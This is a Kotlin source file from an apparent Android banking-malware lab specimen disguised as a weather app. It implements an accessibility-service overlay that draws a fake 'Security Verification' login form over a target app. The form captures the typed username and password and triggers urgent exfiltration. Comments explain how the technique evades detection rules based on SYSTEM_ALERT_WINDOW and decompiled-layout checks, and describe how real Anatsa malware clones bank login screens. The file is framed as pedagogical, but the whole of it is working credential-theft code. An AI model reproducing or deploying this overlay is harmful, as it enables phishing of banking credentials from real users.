package com.skyweather.forecast.core

import android.accessibilityservice.AccessibilityService
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

/**
 * TYPE_ACCESSIBILITY_OVERLAY credential capture overlay.
 *
 * ══════════════════════════════════════════════════════════════════
 * ANALYSIS §5.4 + §5.1 — The 2025 Overlay Evolution
 * ══════════════════════════════════════════════════════════════════
 *
 * Pre-2025: Overlay required SYSTEM_ALERT_WINDOW (SAW) permission.
 *   User sees: "Allow SkyWeather to display over other apps?"
 *   Detection: manifest declares SYSTEM_ALERT_WINDOW → instant flag.
 *
 * 2025+: TYPE_ACCESSIBILITY_OVERLAY (window type 2032).
 *   User sees: NOTHING extra. Accessibility grant IS the overlay permission.
 *   Detection: SYSTEM_ALERT_WINDOW is NOT in manifest. Old rules miss it.
 *
 * This is the single most important evolution in 2025 banker malware.
 * Every detection rule that keys on SAW permission is now bypassed.
 *
 * How it works:
 *   1. AccessibilityService detects target app foreground (TYPE_WINDOW_STATE_CHANGED)
 *   2. Service creates WindowManager.LayoutParams with TYPE_ACCESSIBILITY_OVERLAY
 *   3. Service adds a view (fake login form) via windowManager.addView()
 *   4. Fake form renders on top of real banking app
 *   5. User types credentials into fake form (thinks it's the real app)
 *   6. Overlay captures input → CredentialStore → C2 exfil
 *   7. Overlay dismisses → real app visible → user continues normally
 *
 * CLAUDE.md constraint: NO real bank login clones. Generic credential
 * form only. Per constraint #5: "Generic pedagogical examples only."
 * ══════════════════════════════════════════════════════════════════
 */
class OverlayRenderer(private val service: AccessibilityService) {

    private val windowManager: WindowManager =
        service.getSystemService(AccessibilityService.WINDOW_SERVICE) as WindowManager

    private var overlayView: View? = null
    private var isShowing = false

    // Track which package triggered the overlay (for credential attribution)
    private var triggeredByPackage: String = ""

    /**
     * Show credential capture overlay on top of target app.
     *
     * WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY (2032):
     *   - Requires AccessibilityService context (not Activity)
     *   - No SYSTEM_ALERT_WINDOW permission needed
     *   - Renders above all app windows
     *   - Receives touch events (user can type into our fake fields)
     *
     * Real Anatsa: downloads HTML overlay templates from C2 per target.
     * Each template mimics the exact login UI of the specific bank.
     * Lab specimen: generic form (CLAUDE.md constraint #5).
     */
    fun showOverlay(targetPackage: String) {
        if (isShowing) return
        triggeredByPackage = targetPackage

        val view = buildOverlayView()

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            // THE critical window type — 2032 = TYPE_ACCESSIBILITY_OVERLAY
            // This bypasses SYSTEM_ALERT_WINDOW entirely.
            // AccessibilityService grant = overlay permission.
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            // FLAG_NOT_TOUCH_MODAL: allow touches on our overlay
            // FLAG_LAYOUT_IN_SCREEN: full-screen coverage
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.CENTER

        try {
            windowManager.addView(view, params)
            overlayView = view
            isShowing = true

            // Make the EditTexts focusable after adding
            // Need to update params to allow focus for credential capture
            params.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            windowManager.updateViewLayout(view, params)
        } catch (_: Exception) {
            // WindowManager failure — service may not have overlay capability
            isShowing = false
        }
    }

    /** Dismiss the overlay — called when non-target app foregrounds */
    fun dismiss() {
        if (!isShowing) return
        try {
            overlayView?.let { windowManager.removeView(it) }
        } catch (_: Exception) {
            // View already removed or not attached
        }
        overlayView = null
        isShowing = false
    }

    /**
     * Build the credential capture overlay view programmatically.
     *
     * No XML layout — builds entirely in code to avoid layout resource
     * that would appear in decompiled APK as suspicious "overlay_login.xml".
     *
     * CLAUDE.md constraint: GENERIC form only. No bank logos, no institution
     * names, no brand colors that mimic any real banking app.
     *
     * Real Anatsa: per-target HTML/WebView overlays downloaded from C2.
     * Each overlay is pixel-perfect clone of target bank's login screen.
     * Template includes: bank logo, brand colors, field labels in local
     * language, "security verification" messaging, fake progress indicators.
     */
    private fun buildOverlayView(): View {
        val layout = LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.WHITE)
            setPadding(dp(32), dp(64), dp(32), dp(32))
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // "Security verification" header — generic social engineering text
        // Real bankers: "Session expired" / "Verify your identity" / "Security update required"
        val header = TextView(service).apply {
            text = "Security Verification"
            textSize = 22f
            setTextColor(Color.parseColor("#1A1A2E"))
            typeface = Typeface.create("sans-serif-medium", Typeface.NORMAL)
            gravity = Gravity.CENTER
        }
        layout.addView(header, marginParams(bottom = dp(8)))

        // Subtext
        val subtext = TextView(service).apply {
            text = "Please verify your identity to continue"
            textSize = 14f
            setTextColor(Color.GRAY)
            gravity = Gravity.CENTER
        }
        layout.addView(subtext, marginParams(bottom = dp(32)))

        // Username/email field
        val usernameField = EditText(service).apply {
            hint = "Email or username"
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS
            setPadding(dp(16), dp(16), dp(16), dp(16))
            setBackgroundColor(Color.parseColor("#F5F5F5"))
            textSize = 16f
            tag = "overlay_username"
        }
        layout.addView(usernameField, fieldParams())

        // Password field
        val passwordField = EditText(service).apply {
            hint = "Password"
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            setPadding(dp(16), dp(16), dp(16), dp(16))
            setBackgroundColor(Color.parseColor("#F5F5F5"))
            textSize = 16f
            tag = "overlay_password"
        }
        layout.addView(passwordField, fieldParams())

        // Submit button — captures entered credentials
        val submitButton = Button(service).apply {
            text = "Continue"
            setBackgroundColor(Color.parseColor("#1A73E8"))
            setTextColor(Color.WHITE)
            textSize = 16f
            isAllCaps = false

            setOnClickListener {
                // Capture credentials from overlay fields
                val username = usernameField.text?.toString() ?: ""
                val password = passwordField.text?.toString() ?: ""

                if (username.isNotEmpty() || password.isNotEmpty()) {
                    // Buffer username
                    if (username.isNotEmpty()) {
                        CredentialStore.capture(
                            CredentialStore.CapturedEvent(
                                packageName = triggeredByPackage,
                                viewId = "overlay_username",
                                text = username,
                                timestamp = System.currentTimeMillis(),
                                eventType = "overlay_usr"
                            )
                        )
                    }

                    // Buffer password
                    if (password.isNotEmpty()) {
                        CredentialStore.capture(
                            CredentialStore.CapturedEvent(
                                packageName = triggeredByPackage,
                                viewId = "overlay_password",
                                text = password,
                                timestamp = System.currentTimeMillis(),
                                eventType = "overlay_pwd"
                            )
                        )
                    }
                }

                // Dismiss overlay — real app becomes visible
                // User thinks login was successful (or "try again")
                dismiss()

                // Trigger URGENT exfil — overlay-captured credentials are high-value
                ForecastSyncWorker.scheduleUrgent(service.applicationContext)
            }
        }
        layout.addView(submitButton, marginParams(top = dp(24)))

        return layout
    }

    // ─── Layout Helpers ───────────────────────────────────────────

    private fun dp(value: Int): Int {
        return (value * service.resources.displayMetrics.density).toInt()
    }

    private fun marginParams(
        top: Int = 0,
        bottom: Int = 0
    ): LinearLayout.LayoutParams {
        return LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            topMargin = top
            bottomMargin = bottom
        }
    }

    private fun fieldParams(): LinearLayout.LayoutParams {
        return LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            topMargin = dp(12)
        }
    }
}
